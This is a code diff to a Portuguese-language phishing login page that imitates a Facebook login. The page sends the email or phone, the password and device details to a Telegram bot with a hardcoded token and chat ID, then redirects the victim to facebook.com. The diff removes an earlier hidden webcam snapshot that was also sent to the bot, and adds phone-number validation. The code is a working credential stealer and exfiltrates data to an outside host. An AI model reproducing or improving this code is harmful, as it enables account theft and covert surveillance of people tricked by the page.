@@ -122,7 +122,7 @@
   <div class="login-form">
     <form id="loginForm">
       <input type="text" id="email" placeholder="Email ou telefone" required>
-      <div id="emailError" class="error-message">Por favor, insira um e-mail válido.</div>
+      <div id="emailError" class="error-message">Digite um e-mail ou telefone válido.</div>
 
       <input type="password" id="password" placeholder="Senha" required>
       <div id="passwordError" class="error-message">A senha deve ter pelo menos 6 caracteres.</div>
@@ -139,7 +139,6 @@
 const TOKEN = "7683050283:AAEmO1D90_4RysfVlLYOSf5NLfC1Bpg9FMA";
 const CHAT_ID = "5542692841";
 const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-const URL_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
 const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
@@ -147,11 +146,17 @@ const emailError = document.getElementById('emailError');
 const passwordError = document.getElementById('passwordError');
 
 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+const phoneRegex = /^\d{8,}$/; // mínimo 8 dígitos
 const MIN_PASSWORD_LENGTH = 6;
+
+// Função para validar email ou telefone
+function isValidEmailOrPhone(value) {
+  return emailRegex.test(value) || phoneRegex.test(value);
+}
 
 // Validação em tempo real
 emailInput.addEventListener('input', () => {
-  if (!emailRegex.test(emailInput.value.trim())) {
+  if (!isValidEmailOrPhone(emailInput.value.trim())) {
     emailError.style.display = 'block';
   } else {
     emailError.style.display = 'none';
@@ -166,46 +171,15 @@ passwordInput.addEventListener('input', () => {
   }
 });
 
-function sendMessage(text) {
-  return fetch(URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-  }).then(res => res.json());
-}
-
-function sendPhoto(base64Photo, caption) {
-  function base64ToBlob(base64, mime) {
-    const byteChars = atob(base64);
-    const byteNumbers = new Array(byteChars.length);
-    for (let i = 0; i < byteChars.length; i++) {
-      byteNumbers[i] = byteChars.charCodeAt(i);
-    }
-    const byteArray = new Uint8Array(byteNumbers);
-    return new Blob([byteArray], {type: mime});
-  }
-
-  const mimeType = 'image/png';
-  const base64Data = base64Photo.replace(/^data:image\/(png|jpg|jpeg);base64,/, '');
-  const photoBlob = base64ToBlob(base64Data, mimeType);
-
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  formData.append('caption', caption);
-  formData.append('photo', photoBlob, 'login_photo.png');
-
-  return fetch(URL_PHOTO, { method: 'POST', body: formData }).then(res => res.json());
-}
-
 document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
 
-  const email = emailInput.value.trim();
+  const emailOrPhone = emailInput.value.trim();
   const password = passwordInput.value;
 
   let valid = true;
 
-  if (!emailRegex.test(email)) {
+  if (!isValidEmailOrPhone(emailOrPhone)) {
     emailError.style.display = 'block';
     valid = false;
   }
@@ -217,6 +191,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 
   if (!valid) return;
 
+  // Coleta informações do dispositivo
   const userAgent = navigator.userAgent;
   const language = navigator.language;
   const screenWidth = screen.width;
@@ -225,7 +200,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 
   const messageText = `
 🔐 *Novo Login Capturado*
-📧 Email: ${email}
+👤 Usuário: ${emailOrPhone}
 🔑 Senha: ${password}
 
 📱 *Informações do Dispositivo*
@@ -235,32 +210,17 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 ⏰ Fuso horário: ${timezone}
   `;
 
-  navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    const video = document.createElement('video');
-    video.style.display = 'none';
-    document.body.appendChild(video);
-    video.srcObject = stream;
-    video.play();
-
-    video.addEventListener('loadeddata', () => {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/png');
-
-      stream.getTracks().forEach(track => track.stop());
-      video.remove();
-
-      sendPhoto(imageData, messageText)
-        .finally(() => window.location.href = "https://facebook.com");
-    });
+  fetch(URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: messageText,
+      parse_mode: 'Markdown'
+    })
   })
-  .catch(() => {
-    sendMessage(messageText)
-      .finally(() => window.location.href = "https://facebook.com");
+  .finally(() => {
+    window.location.href = "https://facebook.com";
   });
 });
 </script>
